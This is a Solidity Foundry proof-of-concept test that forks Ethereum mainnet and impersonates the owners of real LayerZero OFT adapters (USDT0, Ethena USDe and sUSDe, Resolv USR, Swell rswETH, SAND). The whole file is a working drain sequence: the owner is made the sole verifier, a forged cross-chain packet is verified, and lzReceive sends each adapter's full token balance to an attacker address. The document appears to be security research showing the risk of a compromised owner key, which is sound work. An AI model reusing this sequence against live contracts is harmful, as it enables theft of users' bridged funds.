// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

interface VmLz {
    function createSelectFork(string calldata url) external returns (uint256 forkId);
    function envOr(string calldata key, string calldata defaultValue) external returns (string memory value);
    function prank(address msgSender) external;
}

interface IERC20Lz {
    function balanceOf(address account) external view returns (uint256);
}

interface IOApp {
    function setPeer(uint32 eid, bytes32 peer) external;
}

interface IOFTAdapter {
    function decimalConversionRate() external view returns (uint256);
}

interface ILayerZeroEndpointV2 {
    struct SetConfigParam {
        uint32 eid;
        uint32 configType;
        bytes config;
    }

    struct Origin {
        uint32 srcEid;
        bytes32 sender;
        uint64 nonce;
    }

    function setConfig(address oapp, address lib, SetConfigParam[] calldata params) external;
    function lzReceive(
        Origin calldata origin,
        address receiver,
        bytes32 guid,
        bytes calldata message,
        bytes calldata extraData
    ) external payable;
}

interface IReceiveUln302 {
    function verify(bytes calldata packetHeader, bytes32 payloadHash, uint64 confirmations) external;
    function commitVerification(bytes calldata packetHeader, bytes32 payloadHash) external;
}

contract LayerZeroOFTSafeDVNPoC {
    VmLz private constant vm = VmLz(address(uint160(uint256(keccak256("hevm cheat code")))));

    address private constant ENDPOINT = address(uint160(0x001a44076050125825900e736c501f859c50fe728c));
    address private constant RECEIVE_ULN302 = 0xc02Ab410f0734EFa3F14628780e6e695156024C2;
    address private constant ATTACKER = 0xDEad0000000000000000000000000000DeaDBEEF;
    address private constant ATTACKER_PEER = address(uint160(0x001111111111111111111111111111111111111111));
    uint32 private constant SRC_EID = 30110;
    uint32 private constant DST_EID = 30101;
    uint64 private constant NONCE = 1;
    bytes32 private constant GUID = 0x7979797979797979797979797979797979797979797979797979797979797979;

    struct Case {
        string name;
        address adapter;
        address owner;
        address token;
        bool useDecimalConversionRate;
    }

    struct UlnConfig {
        uint64 confirmations;
        uint8 requiredDVNCount;
        uint8 optionalDVNCount;
        uint8 optionalDVNThreshold;
        address[] requiredDVNs;
        address[] optionalDVNs;
    }

    function setUp() public {
        string memory rethRpc = vm.envOr("RETH_RPC", "http://127.0.0.1:8545");
        string memory rpc = vm.envOr("MAINNET_RPC_URL", rethRpc);
        vm.createSelectFork(rpc);
    }

    function test_usdt0_oft_safeAsDvn() public {
        _run(
            Case({
                name: "USDT0",
                adapter: address(uint160(0x006c96de32cea08842dcc4058c14d3aaad7fa41dee)),
                owner: address(uint160(0x004dff9b5b0143e642a3f63a5bcf2d1c328e600bf8)),
                token: 0xdAC17F958D2ee523a2206206994597C13D831ec7,
                useDecimalConversionRate: false
            })
        );
    }

    function test_ethena_usde_oft_safeAsDvn() public {
        _run(
            Case({
                name: "Ethena USDe",
                adapter: address(uint160(0x005d3a1ff2b6bab83b63cd9ad0787074081a52ef34)),
                owner: 0x3B0AAf6e6fCd4a7cEEf8c92C32DFeA9E64dC1862,
                token: 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3,
                useDecimalConversionRate: true
            })
        );
    }

    function test_ethena_susde_oft_safeAsDvn() public {
        _run(
            Case({
                name: "Ethena sUSDe",
                adapter: address(uint160(0x00211cc4dd073734da055fbf44a2b4667d5e5fe5d2)),
                owner: 0x3B0AAf6e6fCd4a7cEEf8c92C32DFeA9E64dC1862,
                token: 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497,
                useDecimalConversionRate: true
            })
        );
    }

    function test_resolv_usr_oft_safeAsDvn() public {
        _run(
            Case({
                name: "Resolv USR",
                adapter: address(uint160(0x00d2ee2776f34ef4e7325745b06e6d464b08d4be0e)),
                owner: address(uint160(0x00d6889f307be1b83bb355d5da7d4478fb0d2af547)),
                token: 0x66a1E37c9b0eAddca17d3662D6c05F4DECf3e110,
                useDecimalConversionRate: true
            })
        );
    }

    function test_swell_rsweth_oft_safeAsDvn() public {
        _run(
            Case({
                name: "Swell rswETH",
                adapter: address(uint160(0x001486d39646cdee84619bd05997319545a8575079)),
                owner: address(uint160(0x0020fdf47509c5efc0e1101e3ce443691781c17f90)),
                token: address(uint160(0x00fae103dc9cf190ed75350761e95403b7b8afa6c0)),
                useDecimalConversionRate: true
            })
        );
    }

    function test_sandbox_sand_oft_safeAsDvn() public {
        _run(
            Case({
                name: "SAND",
                adapter: address(uint160(0x00ac531eb26ca1d21b85126de8fb87e80e09002dcf)),
                owner: address(uint160(0x006ec4090d0f3cb76d9f3d8c4d5bb058a225e560a1)),
                token: 0x3845badAde8e6dFF049820680d1F14bD3903a5d0,
                useDecimalConversionRate: true
            })
        );
    }

    function _run(Case memory c) internal {
        uint256 beforeAdapter = IERC20Lz(c.token).balanceOf(c.adapter);
        uint256 beforeAttacker = IERC20Lz(c.token).balanceOf(ATTACKER);
        require(beforeAdapter > 0, "adapter token balance is zero");

        uint256 conversionRate = c.useDecimalConversionRate
            ? IOFTAdapter(c.adapter).decimalConversionRate()
            : 1;
        require(conversionRate > 0, "decimalConversionRate is zero");
        uint256 amountSd = beforeAdapter / conversionRate;
        require(amountSd > 0, "amountSD is zero");
        require(amountSd <= type(uint64).max, "amountSD overflows uint64");
        uint256 amountLd = amountSd * conversionRate;

        bytes32 ownerB32 = _addressToBytes32(c.owner);
        bytes32 attackerPeerB32 = _addressToBytes32(ATTACKER_PEER);
        bytes32 recipientB32 = _addressToBytes32(ATTACKER);
        bytes32 adapterB32 = _addressToBytes32(c.adapter);

        address[] memory requiredDvns = new address[](1);
        requiredDvns[0] = c.owner;
        address[] memory optionalDvns = new address[](0);
        bytes memory ulnConfig = abi.encode(
            UlnConfig({
                confirmations: 1,
                requiredDVNCount: 1,
                optionalDVNCount: 255,
                optionalDVNThreshold: 0,
                requiredDVNs: requiredDvns,
                optionalDVNs: optionalDvns
            })
        );

        ILayerZeroEndpointV2.SetConfigParam[] memory params =
            new ILayerZeroEndpointV2.SetConfigParam[](1);
        params[0] = ILayerZeroEndpointV2.SetConfigParam({
            eid: SRC_EID,
            configType: 2,
            config: ulnConfig
        });

        bytes memory packetHeader = abi.encodePacked(
            uint8(1),
            NONCE,
            SRC_EID,
            attackerPeerB32,
            DST_EID,
            adapterB32
        );
        require(packetHeader.length == 81, "bad packet header length");
        bytes memory message = abi.encodePacked(recipientB32, uint64(amountSd));
        require(message.length == 40, "bad OFT message length");
        bytes32 payloadHash = keccak256(abi.encodePacked(GUID, message));

        vm.prank(c.owner);
        ILayerZeroEndpointV2(ENDPOINT).setConfig(c.adapter, RECEIVE_ULN302, params);

        vm.prank(c.owner);
        IOApp(c.adapter).setPeer(SRC_EID, attackerPeerB32);

        vm.prank(c.owner);
        IReceiveUln302(RECEIVE_ULN302).verify(packetHeader, payloadHash, 1);

        vm.prank(c.owner);
        IReceiveUln302(RECEIVE_ULN302).commitVerification(packetHeader, payloadHash);

        vm.prank(c.owner);
        ILayerZeroEndpointV2(ENDPOINT).lzReceive(
            ILayerZeroEndpointV2.Origin({srcEid: SRC_EID, sender: attackerPeerB32, nonce: NONCE}),
            c.adapter,
            GUID,
            message,
            ""
        );

        uint256 afterAdapter = IERC20Lz(c.token).balanceOf(c.adapter);
        uint256 afterAttacker = IERC20Lz(c.token).balanceOf(ATTACKER);
        require(afterAttacker > beforeAttacker, "attacker token balance did not increase");
        require(afterAttacker - beforeAttacker == amountLd, "unexpected attacker delta");
        require(beforeAdapter - afterAdapter == amountLd, "unexpected adapter delta");
        ownerB32;
        bytes(c.name);
    }

    function _addressToBytes32(address account) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(account)));
    }
}
